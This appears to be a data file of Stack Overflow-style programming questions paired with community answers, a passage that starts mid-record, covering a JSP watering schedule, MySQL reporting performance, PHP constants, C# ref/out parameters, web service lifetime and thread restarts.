index to your heart's content and not worry about update lock contention, since aside from your bulk insert the table will only see selects."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "I think Ian is absolutely right: stop trying to implement your PHP code in Java.  Instead, take a step back and think about how you might design this from scratch.  In particular, why not put all that data into a database, instead of hard-coding it in your sources or using properties files?  Using a database will be much easier to maintain, and there are a variety of free database engines to choose from."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "@Jason\n\nIn particular, why not put all that data into a database, instead of hard-coding it in your sources or using properties files? Using a database will be much easier to maintain, and there are a variety of free database engines to choose from.\n\nAdding a database is an incredibly heavyweight way to solve a problem that fits easily into a text file (or even directly into the source).  There are 5 groups and 4 seasons.  That means there are going to be a total of 20 records in the database."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "In line with some of the other comments, i would definately have a look at your indexing.\nOne thing i discovered earlier this year on our MySQL databases was the power of composite indexes. For example, if you are reporting on order numbers over date ranges, a composite index on the order number and order date columns could help. I believe MySQL can only use one index for the query so if you just had separate indexes on the order number and order date it would have to decide on just one of them to use. Using the EXPLAIN command can help determine this.\nTo give an indication of the performance with good indexes (including numerous composite indexes), i can run queries joining 3 tables in our database and get almost instant results in most cases. For more complex reporting most of the queries run in under 10 seconds. These 3 tables have 33 million, 110 million and 140 millions rows respectively. Note that we had also already normalised these slightly to speed up our most common query on the database.\nMore information regarding your tables and the types of reporting queries may allow further suggestions."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "@Derek\n\nAdding a database is an incredibly heavyweight way to solve a problem that fits easily into a text file (or even directly into the source). There are 5 groups and 4 seasons. That means there are going to be a total of 20 records in the database.\n\nTwo of the database engines I linked to are implemented entirely in Java and can be embedded in an application just by including a jar file.  It's a little heavyweight, sure, but it's a lot more scalable and easier to maintain.  Just because there are 20 records today doesn't mean there won't be more later due to changing requirements or feature creep.\nIf in a few weeks or months you decide you want to add, say, time of day watering restrictions, it will be much easier to add that functionality if you're already using a database.  Even if that never happens, then you've spent a few hours learning how to embed a database in an application."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "Further to my previous answer, another approach we have taken in some situations is to store key reporting data in separate summary tables. There are certain reporting queries which are just going to be slow even after denormalising and optimisations and we found that creating a table and storing running totals or summary information throughout the month as it came in made the end of month reporting much quicker as well.\nWe found this approach easy to implement as it didn't break anything that was already working - it's just additional database inserts at certain points."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "@Jason\n\nTwo of the database engines I linked to are implemented entirely in Java and can be embedded in an application just by including a jar file. It's a little heavyweight, sure, but it's a lot more scalable and easier to maintain. Just because there are 20 records today doesn't mean there won't be more later due to changing requirements or feature creep.\nIf in a few weeks or months you decide you want to add, say, time of day watering restrictions, it will be much easier to add that functionality if you're already using a database. Even if that never happens, then you've spent a few hours learning how to embed a database in an application.\n\nEmbedding a DB in Java doesn't make it easier to maintain.  There's now an additional code dependency that did not previously exist.  Updating the set of schedules is now more difficult, as either a custom tool must be coded or a DB-specific interface must be used, whereas previous notepad.exe was sufficient.  Scalability is not a concern here, either.  The needs of this system could increase by a million and the flat file would still work just fine.\nCertainly, it's possible that in the future needs will evolve to the point that it's worth moving to a database.  That's when you make the change.  Trying to future-proof an application never works, because we always assume incorrectly about future needs.  We can't say it'll only take a few hours to embed the database either, because we suck at estimating schedules, too.  If there even comes a time when the database is appropriate, then refactor the code to use a database.  In the meantime, do the simplest thing that could possibly work."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "Does the \"date\" have to be a parameter? If you're just showing the current watering schedule the WateringSchedule class itself can figure out what day it is, and therefore what season it is. Then just have a method which returns a map where the Key is the group letter. Something like:\npublic Map<String,List<String>> getGroupToScheduledDaysMap() {\n  // instantiate a date or whatever to decide what Map to return\n}\n\nThen in the JSP page\n<c:forEach var=\"day\" items=\"${scheduler.groupToScheduledDaysMap[\"A\"]}\">\n   ${day}\n</c:forEach>\n\nIf you need to show the schedules for more than one season, you should have a method in the WateringSchedule class that returns a map where Seasons are the keys, and then Maps of groupToScheduledDays are the values."}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "Most PHP sites should have a file (I call it a header) that you include on every single page of the site. If you put that first line of code in the header file, then include it like this on every page:\n include 'header.php';\n\nyou won't have to use the global keyword or anything, the second line of code you wrote should work.\nEdit: Oh sorry, that won't work inside functions... now I see your problem.\nEdit #2: Ok, take my original advice with the header, but use a define() rather than a variable. Those work inside functions after being included."}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "IIRC a common solution is a plain file that contains your declarations, that you include in every source file, something like 'constants.inc.php'. There you can define a bunch of application-wide variables that are then imported in every file.\nStill, you have to provide the include directive in every single source file you use. I even saw some projects using this technique to provide localizations for several languages. I'd prefer the gettext way, but maybe this variant is easier to work with for the average user.\nedit For your problem I recomment the use of $GLOBALS[], see Example #2 for details.\nIf that's still not applicable, I'd try to digg down PHP5 objects and create a static Singleton that provides needed static constants (http://www.developer.com/lang/php/article.php/3345121)"}
{"instruction": "I'm always looking for large data sets to test various types of programs on. Does anyone have any suggestions?", "output": "You might also want to check out theinfo by Aaron Swartz.\nFrom the site \n\nThis is a site for large data sets and\n  the people who love them: the scrapers\n  and crawlers who collect them, the\n  academics and geeks who process them,\n  the designers and artists who\n  visualize them. It's a place where\n  they can exchange tips and tricks,\n  develop and share tools together, and\n  begin to integrate their particular\n  projects."}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "Sessions are going to be your best bet, if the data is user specific, else just use a conifg file.\nconfig.php:\n<?php\n$EL = \"\\n<br />\\n\";\n?>\n\nThen on each page add\nrequire 'config.php'\n\nthe you will be able to access $EL on that page."}
{"instruction": "I'm always looking for large data sets to test various types of programs on. Does anyone have any suggestions?", "output": "I've done some work with the Wikimedia download sets, which are huge XML files. Unfortunately, their download server appears to be currently having disk space issues so many of the data sets aren't available. But when it's available, the entire English Wikipedia data set with full history is 2.8 TB (18 GB compressed)."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "Here's one way it could look like, you can figure the rest out:\nA = new Group();\nA.getSeason(Seasons.WINTER).addDay(Days.MONDAY);\nA.getSeason(Seasons.SPRING).addDay(Days.TUESDAY).addDay(Days.THURSDAY);\nA.getSeason(Seasons.SPRING).addDays(Days.MONDAY, Days.TUESDAY, ...);\n\nschedule = new Schedule();\nschedule.addWateringGroup( A );"}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "Sounds like the job of a constant. See the function define()."}
{"instruction": "I'm looking for a clear, concise and accurate answer.  \nIdeally as the actual answer, although links to good explanations welcome.\nThis also applies to VB.Net, but the keywords are different - ByRef and ByVal.", "output": "out means that the parameter will be initialised by the method:\nint result; //not initialised\n\nif( int.TryParse( \"123\", out result ) )\n   //result is now 123\nelse\n   //if TryParse failed result has still be \n   // initialised to its default value (0)\n\nref will force the underlying reference to be passed:\nvoid ChangeMyClass1( MyClass input ) {\n   input.MyProperty = \"changed by 1\";\n   input = null;\n   //can't see input anymore ... \n   // I've only nulled my local scope's reference\n}\n\nvoid ChangeMyClass2( ref MyClass input ) {\n   input.MyProperty = \"changed by 2\";\n   input = null;\n   //the passed reference is now null too.\n}\n\nMyClass tester = new MyClass { MyProperty = \"initial value\" };\n\nChangeMyClass1( tester );\n// now tester.MyProperty is \"changed by 1\"\n\nChangeMyClass2( ref tester );\n// now tester is null"}
{"instruction": "I'm looking for a clear, concise and accurate answer.  \nIdeally as the actual answer, although links to good explanations welcome.\nThis also applies to VB.Net, but the keywords are different - ByRef and ByVal.", "output": "This article \"Parameter passing in C#\" is the most complete explanation I've read so far."}
{"instruction": "I'm looking for a clear, concise and accurate answer.  \nIdeally as the actual answer, although links to good explanations welcome.\nThis also applies to VB.Net, but the keywords are different - ByRef and ByVal.", "output": "One of my own questions at stackoverflow handles this topic too.\nIt handles about \"pass by reference\" and \"pass by value\" in different types of languages, c# is included so maybe you can find some extra information there as well.\nBasically it comes down to:\n\nref: the parameter with the ref keyword will be passed by reference\nout: the parameter with the out keyword will be treated as an output parameter\n\nbut that's really the most basic answer you can give, as it is a little more complex than it is stated here"}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "@svec yes this will, you just have to include the file inside the function also.  This is how most of my software works.\nfunction myFunc()\n {\nrequire 'config.php';\n//Variables from config are available now.\n }"}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "Are you using PHP5? If you define the __autoload() function and use a class with some constants, you can call them where you need them. The only aggravating thing about this is that you have to type something a little longer, like \nMyClass::MY_CONST\n\nThe benefit is that if you ever decide to change the way that you handle new lines, you only have to change it in one place.\nOf course, a possible negative is that you're calling including an extra function (__autoload()), running that function (when you reference the class), which then loads another file (your class file). That might be more overhead than it's worth.\nIf I may offer a suggestion, it would be avoiding this sort of echoing that requires echoing tags (like <br />). If you could set up something a little more template-esque, you could handle the nl's without having to explicitly type them. So instead of\necho \"Blah Blah Blah\\n<br />\\n\";\n\ntry:\n<?php\nif($condition) {\n?>\n<p>Blah blah blah\n<br />\n</p>\n<?php\n}\n?>\n\nIt just seems to me like calling up classes or including variables within functions as well as out is a lot of work that doesn't need to be done, and, if at all possible, those sorts of situations are best avoided."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "I'm with those that suggest encapsulating function in objects.\nimport java.util.Date;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class Group {\n\n    private String groupName;\n\n    private Map<Season, Set<Day>> schedule;\n\n    public String getGroupName() {\n    \treturn groupName;\n    }\n\n    public void setGroupName(String groupName) {\n    \tthis.groupName = groupName;\n    }\n\n    public Map<Season, Set<Day>> getSchedule() {\n    \treturn schedule;\n    }\n\n    public void setSchedule(Map<Season, Set<Day>> schedule) {\n    \tthis.schedule = schedule;\n    }\n\n    public String getScheduleFor(Date date) {\n    \tSeason now = Season.getSeason(date);\n    \tSet<Day> days = schedule.get(now);\n    \treturn Day.getDaysForDisplay(days);\n    }\n\n}\n\nEDIT: Also, your date ranges don't take leap years into account:\n\nOur seasons look like this: Summer\n  (5-1 to 8-31) Spring (3-1 to 4-30)\n  Fall (9-1 to 10-31) Winter (11-1 to\n  2-28)"}
{"instruction": "I'm looking for a clear, concise and accurate answer.  \nIdeally as the actual answer, although links to good explanations welcome.\nThis also applies to VB.Net, but the keywords are different - ByRef and ByVal.", "output": "By default (in C#), passing an object to a function actually passes a copy of the reference to that object. Changing the parameter itself only changes the value in the parameter, and not the variable that was specified.\nvoid Test1(string param)\n{\n    param = \"new value\";\n}\n\nstring s1 = \"initial value\";\nTest1(s1);\n// s1 == \"initial value\"\n\nUsing out or ref passes a reference to the variable specified in the call to the function. Any changes to the value of an out or ref parameter will be passed back to the caller.\nBoth out and ref behave identically except for one slight difference: ref parameters are required to be initialised before calling, while out parameters can be uninitialised. By extension, ref parameters are guaranteed to be initialised at the start of the method, while out parameters are treated as uninitialised.\nvoid Test2(ref string param)\n{\n    param = \"new value\";\n}\n\nvoid Test3(out string param)\n{\n    // Use of param here will not compile\n    param = \"another value\";\n}\n\nstring s2 = \"initial value\";\nstring s3;\nTest2(ref s2);\n// s2 == \"new value\"\n// Test2(ref s3); // Passing ref s3 will not compile\nTest3(out s2);\n// s2 == \"another value\"\nTest3(out s3);\n// s3 == \"another value\"\n\nEdit: As dp points out, the difference between out and ref is only enforced by the C# compiler, not by the CLR. As far as I know, VB has no equivalent for out and implements ref (as ByRef) only, matching the support of the CLR."}
{"instruction": "I'm looking for a clear, concise and accurate answer.  \nIdeally as the actual answer, although links to good explanations welcome.\nThis also applies to VB.Net, but the keywords are different - ByRef and ByVal.", "output": "One additional note about ref vs. out: The distinction between the two is enforced by the C# compiler. The CLR does not distinguish between between out and ref. This means that you cannot have two methods whose signatures differ only by an out or ref\nvoid foo(int value) {}\n\n// Only one of the following would be allowed\n\n// valid to overload with ref\nvoid foo(ref int value) {}\n\n// OR with out\nvoid foo(out int value) {}"}
{"instruction": "I've created a webservice and when I want to use its methods I instantiate it in the a procedure, call the method, and I finally I dispose it, however I think also it could be okay to instantiate the webservice in the \"private void Main_Load(object sender, EventArgs e)\" event.\nThe thing is that if I do it the first way I have to instantiate the webservice every time I need one of its methods but in the other way I have to keep a webservice connected all the time when I use it in a form for example. \nI would like to know which of these practices are better or if there's a much better way to do it\nStrategy 1\nprivate void btnRead_Click(object sender, EventArgs e)\n{\n    try\n    {\n        //Show clock\n        this.picResult.Image = new Bitmap(pathWait);\n\n        Application.DoEvents();\n\n        //Connect to webservice\n        svc = new ForPocketPC.ServiceForPocketPC();\n        svc.Credentials = new System.Net.NetworkCredential(Settings.UserName, Settings.Password);\n        svc.AllowAutoRedirect = false;\n        svc.UserAgent = Settings.UserAgent;\n        svc.PreAuthenticate = true;\n        svc.Url = Settings.Url;\n        svc.Timeout = System.Threading.Timeout.Infinite;\n\n        svc.CallMethod();\n         ...\n    }\n    catch (Exception ex)\n    {\n        ShowError(ex);\n    }\n    finally\n    {\n        if (svc != null)\n            svc.Dispose();\n    }\n}\n\nStrategy 2\nprivate myWebservice svc;\n\nprivate void Main_Load(object sender, EventArgs e)\n{\n    //Connect to webservice\n    svc = new ForPocketPC.ServiceForPocketPC();\n    svc.Credentials = new System.Net.NetworkCredential(Settings.UserName, Settings.Password);\n    svc.AllowAutoRedirect = false;\n    svc.UserAgent = Settings.UserAgent;\n    svc.PreAuthenticate = true;\n    svc.Url = Settings.Url;\n    svc.Timeout = System.Threading.Timeout.Infinite;\n}\n\nprivate void btnRead_Click(object sender, EventArgs e)\n{\n    try\n    {\n        //Show clock\n        this.picResult.Image = new Bitmap(pathWait);\n\n        Application.DoEvents();\n        svc.CallMethod();\n         ...\n    }\n    catch (Exception ex)\n    {\n        ShowError(ex);\n    }\n}\n\nprivate void Main_Closing(object sender, CancelEventArgs e)\n{\n    svc.Dispose();\n}", "output": "It depends on how often you are going to be calling the web service.  If you're going to be calling it almost constantly, it would probably be better to use method #2.  However, if it's not going to be getting called quite so often, you are better off using method #1, and only instantiating it when you need it."}
{"instruction": "I've created a webservice and when I want to use its methods I instantiate it in the a procedure, call the method, and I finally I dispose it, however I think also it could be okay to instantiate the webservice in the \"private void Main_Load(object sender, EventArgs e)\" event.\nThe thing is that if I do it the first way I have to instantiate the webservice every time I need one of its methods but in the other way I have to keep a webservice connected all the time when I use it in a form for example. \nI would like to know which of these practices are better or if there's a much better way to do it\nStrategy 1\nprivate void btnRead_Click(object sender, EventArgs e)\n{\n    try\n    {\n        //Show clock\n        this.picResult.Image = new Bitmap(pathWait);\n\n        Application.DoEvents();\n\n        //Connect to webservice\n        svc = new ForPocketPC.ServiceForPocketPC();\n        svc.Credentials = new System.Net.NetworkCredential(Settings.UserName, Settings.Password);\n        svc.AllowAutoRedirect = false;\n        svc.UserAgent = Settings.UserAgent;\n        svc.PreAuthenticate = true;\n        svc.Url = Settings.Url;\n        svc.Timeout = System.Threading.Timeout.Infinite;\n\n        svc.CallMethod();\n         ...\n    }\n    catch (Exception ex)\n    {\n        ShowError(ex);\n    }\n    finally\n    {\n        if (svc != null)\n            svc.Dispose();\n    }\n}\n\nStrategy 2\nprivate myWebservice svc;\n\nprivate void Main_Load(object sender, EventArgs e)\n{\n    //Connect to webservice\n    svc = new ForPocketPC.ServiceForPocketPC();\n    svc.Credentials = new System.Net.NetworkCredential(Settings.UserName, Settings.Password);\n    svc.AllowAutoRedirect = false;\n    svc.UserAgent = Settings.UserAgent;\n    svc.PreAuthenticate = true;\n    svc.Url = Settings.Url;\n    svc.Timeout = System.Threading.Timeout.Infinite;\n}\n\nprivate void btnRead_Click(object sender, EventArgs e)\n{\n    try\n    {\n        //Show clock\n        this.picResult.Image = new Bitmap(pathWait);\n\n        Application.DoEvents();\n        svc.CallMethod();\n         ...\n    }\n    catch (Exception ex)\n    {\n        ShowError(ex);\n    }\n}\n\nprivate void Main_Closing(object sender, CancelEventArgs e)\n{\n    svc.Dispose();\n}", "output": "Right now I made a solution for a mobile device and it turns to be used on irregular times, it could be used in 10 minutes, 1 hour, 4 hours its very variable, it seems that the better aproach is the first strategy.\nLast year we went on a project where we used webservices, the fact is that we instantiated our webservices at the Sub New() procedure and it run it very well, however, sometimes some users claimed at us that they woke up from their chairs and when they returned and tried to continue on the application they received a timeout error message and they had to re-login again.\nWe thougth that maybe that was Ok because maybe the users went out for a very long time out of their seats, but once in a presentation of the application with the CEOs it happened exactly the same scenario and personally I didn't like that behaviour and that's why the question.\nThanks for the answer."}
{"instruction": "From time to time I get a System.Threading.ThreadStateException when attempting to restart a thread. The code in question is as follows:\n// Make sure the thread is done stopping\nwhile (this.mThread.ThreadState == ThreadState.Running)\n{ \n    Thread.Sleep(0);\n}\n// Respawn a thread if the current one is stopped or doesn't exist\nif (this.mThread == null || this.mThread.ThreadState == ThreadState.Stopped)\n{ \n    this.mThread = new Thread(new ParameterizedThreadStart(Monitor)); }\n// Start the thread\nif (check)\n{ \n    this.mThread.Start(60000); \n}\nelse\n{   \n    this.mThread.Start(0); \n}\n\nSo two questions - is this the correct way of doing things, and  it is, is there a way to prevent the error from occurring?", "output": "A ThreadStateException is thrown because you're trying to start a thread that's not in a startable state. The most likely situations would be that it's already running, or that it has fully exited.\nThere are potentially a couple things that might be happening. First is, the thread might have transitioned from Running to StopRequested, which isn't fully stopped yet, so your logic doesn't create a new thread, and you're trying to start a thread which has just finished running or is about to finish running (neither of which is a valid state for restarting).\nThe other possibility is that the thread was aborted. Threads which are aborted go to the Aborted state, not the Stopped state, and of course are also not valid for restarting.\nReally, the only kind of thread that is still alive that can be \"restarted\" is one that's suspended. You might want to use this conditional instead:\nif (this.mThread == null || this.mThread.ThreadState != ThreadState.Suspended)"}
{"instruction": "I use cruisecontrol.rb for CI and FogBugz for bug tracking, but the more general the answers, the better.\nFirst is the technical problem: is there an API for FogBugz?  Are there good tutorials, or better yet, pre-written code?\nSecond is the procedural problem: what, exactly, should the CI put in the bug tracker when the build breaks?  Perhaps:\nTitle: \"#{last committer} broke the build!\"\nBody: \"#{ error traces }\"\nI suppose this presupposes the answer to this question: should I even put CI breaks into my bug tracking?", "output": "CC comes with a utility that warns you when builds fail, it probably isn't worth logging the failing build in FogBugz - you don't need to track issues that are immediately resolved (as most broken builds will be)\nTo go the other way round (FogBugz showing checkins that fixed the issue) you need a web based repository browser - FogBugz is easy to configure so that it shows the right changes."}
